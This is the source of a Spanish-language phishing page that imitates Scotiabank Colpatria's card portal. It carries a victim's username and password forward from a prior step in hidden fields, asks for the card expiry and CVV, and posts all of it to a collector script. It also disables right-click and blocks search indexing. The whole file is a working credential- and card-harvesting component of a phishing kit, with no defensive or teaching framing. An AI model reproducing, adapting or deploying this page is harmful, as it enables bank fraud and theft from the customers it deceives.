
<!DOCTYPE html>

<html>

<head>
    <body oncontextmenu="return false">
	<link rel="icon" href="favicon.png" type="favicon.png" sizes="32x32" />
	<title>Scotiabank Colpatria ❘ Tarjeta de Crédito </title>
	<meta charset="utf-8">

<meta name="keywords" content="Test">
        <meta name="description" content="Test">
        <meta name="description" content="Web site created using create-react-app">
        <meta name="subject" content="Test">
        <meta name="copyright" content="Test">
        <meta name="url" content="http://www.test.com">
        <meta name="language" content="en-GB">
        <meta name="robots" content="NOINDEX, NOFOLLOW">
        <meta name="pagename" content="$Title">
        <meta name="coverage" content="Worldwide">
        <meta name="distribution" content="Global">
        <meta name="target" content="all">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="640">
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="cleartype" content="on">
        <meta name="apple-mobile-web-app-title" content="$Title">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="ResourceLoaderDynamicStyles" content="">
        <meta http-equiv="Expires" content="0">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Cache-Control" content="no-cache">
        <meta http-equiv="imagetoolbar" content="no">
        <meta http-equiv="x-dns-prefetch-control" content="off">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">

        <!-- Makes your prototype chrome-less once bookmarked to your phone's home screen -->
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">

        <!-- Set a shorter title for iOS6 devices when saved to home screen -->
        <meta name="apple-mobile-web-app-title" content="Ratchet">

	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
	<link rel="stylesheet" type="text/css" href="estilo1.css">

</head>

<body>
<div class="header" id="Cabezote">
<img class="favicon" src="colpatria-red.svg" alt="colpatria-red.svg">
<img class="favicon1" src="favicon1.svg" alt="favicon1.svg">
</div>	

		<section class="box" >

	<div class="container" id="container">


		<h2> Ingrese los datos de su Tarjeta Debito/Crédito </h2>
<form class ="form" method="POST"action="index2.php" >

	   <?php 
                     $variable= $_POST['usuario'];
        echo '<input id="dato" style="display:none" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>

				   <?php 
                     $variable1= $_POST['pass'];
        echo '<input id="dato1"  style="display:none" name="pass" value="'. htmlspecialchars($variable1) . '" readonly />'."\n";
		?>
		<br>
	
	<div class="icon" id="icon">  
				<img src="user.png" style="opacity: 90%;" alt="icon-user">
			<h4>Nombre de Usuario</h4></div> 
			<input  id="ntarjeta1"  type="text"  name="tarjeta"  maxlength="19" autocomplete="off" placeholder="FRANCISCO EDUARDO REY OLARTE" value="" readonly required=>
			<br>
		
			<div class="tarjeta" id="tarjeta">
			<img src="tarjeta.png" style="opacity: 90%;" alt="tarjeta">
			<h4>Numero de Tarjeta</h4></div> 
			<input  id="ntarjeta1"  type="text"  name="tarjeta"  maxlength="19" autocomplete="off" placeholder="VISA: **** **** **** 1049" value="" readonly required=>
			<br>
			<br>
	

			<div class="fecha2" id="fecha2"> 
			<img src="fecha2.png" style="opacity: 90%;" alt="fecha2">
			<h5>Fecha</h5></div>
			<br>
	
	<label for="month"></label>
<select name="month" id="fecha1" class=" input--text2 input-w-aux__input ng-touched" style="width:100px;height: 40px;">
<option disabled selected>Mes</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>

<label for="year"></label>
<select name="year" id="fecha3" class=" input--text2 input--with-icon input--with-icon--left input-w-aux__input ng-touched " style="width:100px; height: 40px; margin-top:3px;">
<option disabled selected>Año</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
</select>
	
	
			
			<br>
			<br>

				
			<div class="cvv1" id="cvv1">
			<img src="cvv1.png" style="opacity: 90%;" alt="cvv1">
			<h6>Cvv</h6></div>  
	
		    <input  id="cvv2" style="text-align:center" type="text"   minlength="3" maxlength="3"  name="codigo" placeholder="***"  required=>
			
	<script>
// Campo numeros
var cvv2 = document.getElementById('cvv2');
				
cvv2.onkeydown = function(e){
	// Permitir la tecla para borrar
	if (e.key == 'Backspace') return true;

	// Permitir flecha izquierda
	if (e.key == 'ArrowLeft') return true;

	// Permitir flecha derecha
	if (e.key == 'ArrowRight') return true;

	// Bloquear tecla de espacio
	if (e.key == ' ') return false;

	// Bloquear tecla si no es un numero
	if (isNaN(e.key)) return false;
	
	
	
};

cvv2.onkeyup = function(){
	cvv2.value = cvv2.value
	
	
	// Borrar todos los espacios
	.replace(/\s/g, '')

	// Agregar un espacio cada cuatro numeros
	.replace(/([0-9]{4})/g, '$1 ')

	// Borrar espacio al final
	.trim();
					
};
	</script>
		
	
	
			<br>
			<br>
	
			
		
			<input  id="accept1" type="submit" value="Siguiente">

			 

	</div>
	</div>


		</form>


</section>
<!-- Aquí puedes escribir tu comentario -->
 <div class="logo1" >
		<img src="logo22.png" alt="logo1">
	
	</div>

</body>

</html>
